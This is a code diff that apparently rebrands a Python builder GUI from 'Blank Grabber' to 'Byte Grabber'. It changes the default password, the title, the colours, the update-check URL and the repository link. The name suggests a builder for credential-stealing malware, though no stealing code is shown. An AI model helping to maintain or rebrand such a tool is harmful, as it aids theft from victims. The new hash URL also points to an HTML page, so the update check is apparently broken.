@@ -21,7 +21,7 @@ from configparser import ConfigParser
 class Utility:
 
 	UpdatesCheck: bool = True
-	Password: str = "blank"
+	Password: str = "byte"
 
 	@staticmethod
 	def ToggleConsole(choice: bool) -> None:
@@ -62,7 +62,7 @@ class Utility:
 			
 				try:
 					_hash = json.loads(content)["hash"]
-					newhash = json.loads(urlopen("https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).read().decode())["hash"]
+					newhash = json.loads(urlopen("https://github.com/Kurofrr/bytegrabber/blob/main/bytegrabber/extras/hash", timeout= 5).read().decode())["hash"]
 
 					os.system("cls")
 					return _hash != newhash # New update available
@@ -75,7 +75,7 @@ class Utility:
 	def CheckConfiguration() -> None:
 		configFile = os.path.join(os.path.dirname(__file__), "config.ini")
 		modified = False
-		password = "blank"
+		password = "byte"
 		updatesCheck = True
 
 		config = ConfigParser()
@@ -477,7 +477,7 @@ class Builder(ctk.CTk):
 		super().__init__()
 
 		ctk.set_appearance_mode("dark")
-		self.title("Blank Grabber [Builder]")
+		self.title("Byte Grabber [Builder]")
 		self.iconbitmap(os.path.join("Extras", "icon.ico"))
 		self.geometry("1250x600")
 		self.resizable(False, False)
@@ -488,7 +488,7 @@ class Builder(ctk.CTk):
 		self.columnconfigure(0, weight= 1)
 		self.columnconfigure(1, weight= 0)
 
-		self.titleLabel = ctk.CTkLabel(self, text= "Blank Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
+		self.titleLabel = ctk.CTkLabel(self, text= "Byte Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#e45463")
 		self.titleLabel.grid(row= 0, column= 0)
 
 		self.builderOptions = BuilderOptionsFrame(self)
@@ -618,7 +618,7 @@ if __name__ == "__main__":
 		if Utility.CheckForUpdates():
 			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (you would be directed to the official github repository)")
 			if response:
-				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
+				webbrowser.open_new_tab("https://github.com/Kurofrr/bytegrabber")
 				exit(0)
 		
 		Utility.CheckConfiguration()
